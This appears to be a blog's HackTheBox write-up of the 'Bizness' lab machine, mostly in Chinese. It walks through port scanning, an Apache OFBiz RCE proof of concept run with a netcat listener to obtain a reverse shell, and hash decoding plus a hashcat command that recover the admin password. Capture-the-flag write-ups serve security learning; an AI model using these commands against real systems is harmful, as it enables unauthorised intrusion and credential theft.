@@ -1,0 +1,524 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+
+  <!-- toc.js -->
+  <script src='/js/toc.js'> </script>
+  <script>
+  window.addEventListener('hexo-blog-decrypt', function(event) {
+    setTimeout(() => {
+      makeList({
+       'target': '#toc',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+
+      makeList({
+       'target': '#toc-mobile',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+    }, 1000);
+  });  
+  </script>
+  
+  <!-- mane defined -->
+  <script>
+    function scriptOnError(errorMsg){
+      try{ document.body.innerHTML = ""; }catch{}
+      document.write("<h1>Error: Loading script error. </h1>");
+      document.write("<p>Some script loading error, Please Disable AD Block and retry again.</p>");
+      document.write("<p>很抱歉，有些脚本似乎無法正常加載，請嘗試關閉 AD Block 再試一次。</p>");
+      document.write("<p>Error on loading: ");
+      document.write(errorMsg);
+      document.write("</p>");
+
+      window.stop ? window.stop() : document.execCommand("Stop");
+    }
+  </script>
+
+  <!-- GTM -->
+  <script>
+    if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+        (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+          new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+          j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+          'https://www.googletagmanager.com/gtm.js?id='+i+dl;
+          f.parentNode.insertBefore(j,f);
+          })(window,document,'script','dataLayer','GTM-T952MB6B');
+    }
+  </script>
+
+  <!-- check baseurl -->
+  <script>
+    setInterval( ()=>{
+      if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+          window.location.href = "https://manesec.github.io" + window.location.pathname;
+      }
+    }, 500);
+  </script>
+
+   <!-- fancybox support -->
+   
+     
+<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
+
+   
+
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Recommand: Let’s Sign Up HTB Academy to get Higher level of knowledge :P 非常推薦: 想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P Bizness0x1 Nmap12345678910111213141516171819202122232425262722&#x2F;tcp    open  ssh">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox - Machine - Bizness">
+<meta property="og:url" content="https://manesec.github.io/2024/01/09/2024-htb-machine/01-Bizness/index.html">
+<meta property="og:site_name" content="Mane">
+<meta property="og:description" content="Recommand: Let’s Sign Up HTB Academy to get Higher level of knowledge :P 非常推薦: 想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P Bizness0x1 Nmap12345678910111213141516171819202122232425262722&#x2F;tcp    open  ssh">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2024-htb/01-Bizness-iSlVh13iuw9iqfH/image-20240107165856-ypts9ze.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2024-htb/01-Bizness-iSlVh13iuw9iqfH/image-20240107170221-i1lhoel.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2024-htb/01-Bizness-iSlVh13iuw9iqfH/image-20240107170806-8wq0mc4.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2024-htb/01-Bizness-iSlVh13iuw9iqfH/image-20240107170821-jf2xzv5.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2024-htb/01-Bizness-iSlVh13iuw9iqfH/image-20240107170858-asc43n8.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2024-htb/01-Bizness-iSlVh13iuw9iqfH/image-20240107171015-ki68yl1.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2024-htb/01-Bizness-iSlVh13iuw9iqfH/image-20240107171215-q57uj7o.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2024-htb/01-Bizness-iSlVh13iuw9iqfH/image-20240107171334-vzveuk8.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2024-htb/01-Bizness-iSlVh13iuw9iqfH/image-20240107171553-824paqj.png">
+<meta property="article:published_time" content="2024-01-09T13:12:21.000Z">
+<meta property="article:modified_time" content="2024-06-03T04:54:22.742Z">
+<meta property="article:author" content="manesec">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://files.manesec.com/file/maneimg1/2024-htb/01-Bizness-iSlVh13iuw9iqfH/image-20240107165856-ypts9ze.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HackTheBox - Machine - Bizness</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T952MB6B"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-8C677QTBX9"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-8C677QTBX9');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/01/14/2024-htb-machine/02-Monitored/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/01/01/2023-htb-machine/12-corporate/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2024/01/09/2024-htb-machine/01-Bizness/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2024/01/09/2024-htb-machine/01-Bizness/&text=HackTheBox - Machine - Bizness"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2024/01/09/2024-htb-machine/01-Bizness/&title=HackTheBox - Machine - Bizness"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2024/01/09/2024-htb-machine/01-Bizness/&is_video=false&description=HackTheBox - Machine - Bizness"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Machine - Bizness&body=Check out this article: https://manesec.github.io/2024/01/09/2024-htb-machine/01-Bizness/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2024/01/09/2024-htb-machine/01-Bizness/&title=HackTheBox - Machine - Bizness"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2024/01/09/2024-htb-machine/01-Bizness/&title=HackTheBox - Machine - Bizness"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2024/01/09/2024-htb-machine/01-Bizness/&title=HackTheBox - Machine - Bizness"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2024/01/09/2024-htb-machine/01-Bizness/&title=HackTheBox - Machine - Bizness"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2024/01/09/2024-htb-machine/01-Bizness/&name=HackTheBox - Machine - Bizness&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2024/01/09/2024-htb-machine/01-Bizness/&t=HackTheBox - Machine - Bizness"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc"></div>
+    <style>
+    	#toc {
+	}
+    	#toc ul {
+	   display: grid ! important;
+	}
+    	#toc li {
+	   margin: 0 0 0 0 ! important;  
+	}
+	#toc .level-1 {
+	   font-size: 0.8rem;
+	   color: #ffffff ;
+	   background: #2bbc8ae5;
+	   padding-left: 3px;
+           padding-right: 3px;
+	}
+
+
+	#toc .level-1:hover {
+	   background: #00b4ddc7;
+	   color: #ffffff !important;
+	}
+
+	#toc .level-2 {
+	   font-size: 0.8rem;
+	   color: #2bbc8a;
+	}
+	#toc .level-3 {
+	   font-size: 0.7rem;
+	   color: #40474b;
+	}
+	#toc .level-4 , #toc .level-5, #toc .level-6 {
+	   font-size: 0.6rem;
+	   color: #8c8c8c;
+	}
+    </style>
+    
+    
+      <script>
+      	setTimeout(() => {
+	  makeList({
+	     'target': '#toc',   // Selector for element to place table of contents
+	     'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+	  });
+	}, 1000);
+      </script>
+     
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HackTheBox - Machine - Bizness
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">manesec</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-01-09T13:12:21.000Z" class="dt-published" itemprop="datePublished">2024-01-09</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p><strong>Recommand</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">Let’s Sign Up HTB Academy to get Higher level of knowledge :P</a></p>
+<p><strong>非常推薦</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P</a></p>
+<h1 id="Bizness"><a href="#Bizness" class="headerlink" title="Bizness"></a>Bizness</h1><h2 id="0x1-Nmap"><a href="#0x1-Nmap" class="headerlink" title="0x1 Nmap"></a>0x1 Nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">22/tcp    open  ssh        syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)</span><br><span class="line"></span><br><span class="line">80/tcp    open  http       syn-ack ttl 63 nginx 1.18.0</span><br><span class="line">|_http-title: Did not follow redirect to https://bizness.htb/</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: nginx/1.18.0</span><br><span class="line"></span><br><span class="line">443/tcp   open  ssl/http   syn-ack ttl 63 nginx 1.18.0</span><br><span class="line">| tls-nextprotoneg:</span><br><span class="line">|_  http/1.1</span><br><span class="line">| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK</span><br><span class="line">| Issuer: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK</span><br><span class="line">| Public Key <span class="built_in">type</span>: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2023-12-14T20:03:40</span><br><span class="line">| Not valid after:  2328-11-10T20:03:40</span><br><span class="line">| MD5:   b182:2fdb:92b0:2036:6b98:8850:b66e:da27</span><br><span class="line">| SHA-1: 8138:8595:4343:f40f:937b:cc82:23af:9052:3f5d:eb50</span><br><span class="line">|_ssl-<span class="built_in">date</span>: TLS randomness does not represent time</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-title: Did not follow redirect to https://bizness.htb/</span><br><span class="line">|_http-server-header: nginx/1.18.0</span><br><span class="line">| tls-alpn:</span><br><span class="line">|_  http/1.1</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x2-shell-in-the-box"><a href="#0x2-shell-in-the-box" class="headerlink" title="0x2 shell in the box"></a>0x2 shell in the box</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ feroxbuster  -k -u https://bizness.htb/ -w /Tools/Wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt  -d 3</span><br></pre></td></tr></table></figure>
+
+<p>看到有個登錄的 <code>https://bizness.htb/control/login</code>​</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2024-htb/01-Bizness-iSlVh13iuw9iqfH/image-20240107165856-ypts9ze.png" alt="image">​</p>
+<p>然後網上找CVE，看到這個</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/abdoghazy2015/ofbiz-CVE-2023-49070-RCE-POC">https://github.com/abdoghazy2015/ofbiz-CVE-2023-49070-RCE-POC</a></p>
+<p>然後</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 1000</span><br><span class="line">$ python3 exploit.py https://bizness.htb/ shell xxxx:1000</span><br></pre></td></tr></table></figure>
+
+<p>然後就拿到了shell</p>
+<h2 id="0x3-root"><a href="#0x3-root" class="headerlink" title="0x3 root"></a>0x3 root</h2><p>跑了下 linpeas，找到了很多關於這個路徑的内容，因爲還沒有知道管理的賬號密碼，所以想辦法拿到賬號密碼。</p>
+<p>然後查了下才知道他是derby的數據庫，所以打包所有的數據，在本地解壓，路徑是下面的，他是用文件的形式保存的。</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2024-htb/01-Bizness-iSlVh13iuw9iqfH/image-20240107170221-i1lhoel.png" alt="image">​</p>
+<p>放在本地</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2024-htb/01-Bizness-iSlVh13iuw9iqfH/image-20240107170806-8wq0mc4.png" alt="image">​</p>
+<p>然後鏈接</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2024-htb/01-Bizness-iSlVh13iuw9iqfH/image-20240107170821-jf2xzv5.png" alt="image">​</p>
+<p>然後看到 <code>USER_LOGIN</code>​ 這個表上有一個賬號密碼</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2024-htb/01-Bizness-iSlVh13iuw9iqfH/image-20240107170858-asc43n8.png" alt="image">​</p>
+<p>​<code>admin:$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I</code>​</p>
+<p>由於hashcat破解不出來，所以就要看看這個程序是怎麽保存密碼的。</p>
+<p>來到這裏：<a target="_blank" rel="noopener" href="http://www.java2s.com/example/java-src/pkg/org/noerp/base/crypto/hashcrypt-0f75c.html">http://www.java2s.com/example/java-src/pkg/org/noerp/base/crypto/hashcrypt-0f75c.html</a></p>
+<p>看到了源碼，源碼很容易看懂，所以</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.<span class="property">security</span>.<span class="property">MessageDigest</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">nio</span>.<span class="property">charset</span>.<span class="property">StandardCharsets</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">util</span>.<span class="property">Base64</span>;</span><br><span class="line"></span><br><span class="line">public <span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line">    public <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span>(<span class="params"><span class="built_in">String</span> args[]</span>) &#123;</span><br><span class="line">      </span><br><span class="line">      <span class="title class_">String</span> crypted = <span class="string">&quot;$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I&quot;</span>;</span><br><span class="line">      int typeEnd = crypted.<span class="title function_">indexOf</span>(<span class="string">&quot;$&quot;</span>, <span class="number">1</span>);</span><br><span class="line">      int saltEnd = crypted.<span class="title function_">indexOf</span>(<span class="string">&quot;$&quot;</span>, typeEnd + <span class="number">1</span>);</span><br><span class="line">      <span class="title class_">String</span> hashType = crypted.<span class="title function_">substring</span>(<span class="number">1</span>, typeEnd);</span><br><span class="line">      <span class="title class_">String</span> salt = crypted.<span class="title function_">substring</span>(typeEnd + <span class="number">1</span>, saltEnd);</span><br><span class="line">      <span class="title class_">String</span> hashed = crypted.<span class="title function_">substring</span>(saltEnd + <span class="number">1</span>);</span><br><span class="line">      </span><br><span class="line">      <span class="title class_">System</span>.<span class="property">out</span>.<span class="title function_">println</span>(<span class="string">&quot;crypted = &quot;</span> + crypted);</span><br><span class="line">      <span class="title class_">System</span>.<span class="property">out</span>.<span class="title function_">println</span>(<span class="string">&quot;hashType = &quot;</span> + hashType);</span><br><span class="line">      <span class="title class_">System</span>.<span class="property">out</span>.<span class="title function_">println</span>(<span class="string">&quot;salt = &quot;</span> + salt);</span><br><span class="line">      <span class="title class_">System</span>.<span class="property">out</span>.<span class="title function_">println</span>(<span class="string">&quot;hashed = &quot;</span> + hashed);</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>輸出看看是什麽：​​</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2024-htb/01-Bizness-iSlVh13iuw9iqfH/image-20240107171015-ki68yl1.png" alt="image">​</p>
+<p>在這個源代碼這裏</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2024-htb/01-Bizness-iSlVh13iuw9iqfH/image-20240107171215-q57uj7o.png" alt="image">​</p>
+<p>可以看到hashed需要經過base64，所以我們需要通過base64逆向一次，得到sha1去爆破。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">encoded_str = <span class="string">&quot;uP0_QaVBpDWFeo8-dRzDqRwXQ2I&quot;</span></span><br><span class="line"></span><br><span class="line">padding = <span class="built_in">len</span>(encoded_str) % <span class="number">4</span></span><br><span class="line"><span class="keyword">if</span> padding:</span><br><span class="line">    encoded_str += <span class="string">&#x27;=&#x27;</span> * (<span class="number">4</span> - padding)</span><br><span class="line"></span><br><span class="line">decoded_bytes = base64.urlsafe_b64decode(encoded_str.replace(<span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;+&#x27;</span>).replace(<span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;/&#x27;</span>))</span><br><span class="line"></span><br><span class="line">hex_string = decoded_bytes.<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Hex String:&quot;</span>, hex_string)</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://files.manesec.com/file/maneimg1/2024-htb/01-Bizness-iSlVh13iuw9iqfH/image-20240107171334-vzveuk8.png" alt="image">​</p>
+<p>得到的sha hash如上，放到hashcat，加密是120，鹽是d，如下</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">b8fd3f41a541a435857a8f3e751cc3a91c174362:<span class="title">d</span></span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat.exe -m 120 hash.txt rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p>得到root密碼：<code>monkeybizness</code>​ </p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2024-htb/01-Bizness-iSlVh13iuw9iqfH/image-20240107171553-824paqj.png" alt="image">​</p>
+<h1 id="Thanks"><a href="#Thanks" class="headerlink" title="Thanks"></a>Thanks</h1><p><strong>Recommand</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">If you really like my writeups, please use this link to sign up for an HTB Academy account to show my appreciation.</a></p>
+<p><strong>非常推薦</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">如果你真的喜歡我寫的writeup，請使用這個鏈接注冊一個 HTB Academy 賬號，以表達我的感謝。</a></p>
+<p><strong>Note</strong>: </p>
+<p>如果你是新手，加入 HTB 的 academy 可以免費看 Tire 0 的所有教程，這對初學者來説是很友好的。 （建議先完成 INTRODUCTION TO ACADEMY）</p>
+<p>If you are a beginner, join HTB’s academy to get free access to all the tutorials for Tire 0. This is very beginner friendly. (It is recommended to complete INTRODUCTION TO ACADEMY first)</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <script>
+        setTimeout(() => {
+          makeList({
+             'target': '#toc-mobile',   // Selector for element to place table of contents
+             'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+          });
+        }, 1000);
+      </script>
+    
+    <div id="toc-footer" style="display: none">
+      <div id="toc-mobile"></div>
+    </div>
+
+    <style>
+        #toc-mobile {
+        }
+        #toc-mobile ul {
+           display: grid ! important;
+        }
+        #toc-mobile li {
+           margin: 0 0 0 0 ! important;
+        }
+        #toc-mobile .level-1 {
+           color: #00b4dd ;
+        }
+        #toc-mobile .level-2 {
+           color: #2bbc8a;
+        }
+        #toc-mobile .level-3 {
+           color: #40474b;
+        }
+        #toc-mobile .level-4, #toc-mobile .level-5, #toc-mobile .level-6 {
+           color: #8c8c8c;
+        }
+    </style>
+
+
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2024/01/09/2024-htb-machine/01-Bizness/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2024/01/09/2024-htb-machine/01-Bizness/&text=HackTheBox - Machine - Bizness"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2024/01/09/2024-htb-machine/01-Bizness/&title=HackTheBox - Machine - Bizness"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2024/01/09/2024-htb-machine/01-Bizness/&is_video=false&description=HackTheBox - Machine - Bizness"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Machine - Bizness&body=Check out this article: https://manesec.github.io/2024/01/09/2024-htb-machine/01-Bizness/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2024/01/09/2024-htb-machine/01-Bizness/&title=HackTheBox - Machine - Bizness"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2024/01/09/2024-htb-machine/01-Bizness/&title=HackTheBox - Machine - Bizness"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2024/01/09/2024-htb-machine/01-Bizness/&title=HackTheBox - Machine - Bizness"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2024/01/09/2024-htb-machine/01-Bizness/&title=HackTheBox - Machine - Bizness"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2024/01/09/2024-htb-machine/01-Bizness/&name=HackTheBox - Machine - Bizness&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2024/01/09/2024-htb-machine/01-Bizness/&t=HackTheBox - Machine - Bizness"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+      
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+  
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    manesec
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
